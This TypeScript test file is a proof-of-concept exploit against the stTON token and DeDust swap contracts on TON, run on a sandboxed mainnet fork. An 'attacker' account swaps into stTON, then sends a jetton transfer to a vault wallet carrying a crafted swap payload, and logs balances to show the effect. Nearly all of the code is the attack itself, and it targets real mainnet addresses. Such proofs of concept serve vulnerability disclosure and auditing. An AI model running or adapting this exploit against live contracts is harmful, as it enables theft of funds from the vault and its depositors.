import '@ton/test-utils';
import { Address, Cell, fromNano, toNano } from '@ton/core';
import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';

import { Factory, MAINNET_FACTORY_ADDR } from '@dedust/sdk';
import { JettonWallet, JettonRoot, Pool } from '@dedust/sdk';

import { prepareSwapParameters } from '../wrappers/Pool';
import { buildJettonToken } from '../wrappers/tokens';
import { getFork } from './MainnetFork';

describe('PoC', () => {
    let blockchain: Blockchain;
    let attacker: SandboxContract<TreasuryContract>;
    let balances;
    const stton_address = Address.parse('EQDNhy-nxYFgUqzfUzImBEP67JqsyMIcyk2S5_RwNNEYku0k');

    beforeEach(async () => {
        blockchain = await getFork();
        attacker = await blockchain.treasury('attacker');
    });

    it('Exploit stTON', async () => {
        // Dedust swap
        const pool_ton_stton = Pool.createFromAddress(
            Address.parse('EQCHFiQM_TTSIiKhUCmWSN4aPSTqxJ4VSBEyDFaZ4izyq95Y'),
        );
        const tston = blockchain.openContract(JettonRoot.createFromAddress(stton_address));
        const factory = blockchain.openContract(Factory.createFromAddress(MAINNET_FACTORY_ADDR));
        const nativeVault = blockchain.openContract(await factory.getNativeVault());

        await nativeVault.sendSwap(attacker.getSender(), {
            poolAddress: pool_ton_stton.address,
            amount: toNano('10'),
            gasAmount: toNano('0.3'),
        });

        const deployerTstonWallet = blockchain.openContract(
            JettonWallet.createFromAddress(await tston.getWalletAddress(attacker.address)),
        );

        const vaultTstonWallet = blockchain.openContract(
            JettonWallet.createFromAddress(
                await tston.getWalletAddress(Address.parse('EQDRoyDi8LVQW4CS84GdAuvavSugxoP1LCE49afEpgZMtYIB')),
            ),
        );
        // Dedust swap

        balances = {
            'TON Balance': fromNano(await attacker.getBalance()),
            'stTON Balance attacker': fromNano(await deployerTstonWallet.getBalance()),
            'stTON Balance vault': fromNano(await vaultTstonWallet.getBalance()),
        };

        console.table(balances);

        const fwdPayload = prepareSwapParameters(
            [
                {
                    pool: Address.parse('EQB7Orui1z_dKONoHuglvi2bMUpmD4fw0Z4C2gewD2FP0BpL'),
                    toToken: buildJettonToken(stton_address),
                    limit: 100n,
                },
            ],
            {
                recipient: attacker.address,
                deadline: Math.floor(Date.now() / 1000) + 100000,
                successPayload: null,
                failPayload: null,
            },
        );

        await deployerTstonWallet.sendTransfer(attacker.getSender(), toNano('0.8'), {
            destination: Address.parse('EQDRoyDi8LVQW4CS84GdAuvavSugxoP1LCE49afEpgZMtYIB'), // wallet
            amount: toNano('0.05'),
            responseAddress: attacker.address,
            customPayload: Cell.EMPTY,
            forwardAmount: toNano('0.7'),
            forwardPayload: fwdPayload,
        });

        balances = {
            'TON Balance': fromNano(await attacker.getBalance()),
            'stTON Balance attacker': fromNano(await deployerTstonWallet.getBalance()),
            'stTON Balance vault': fromNano(await vaultTstonWallet.getBalance()),
        };

        console.table(balances);
    });
});
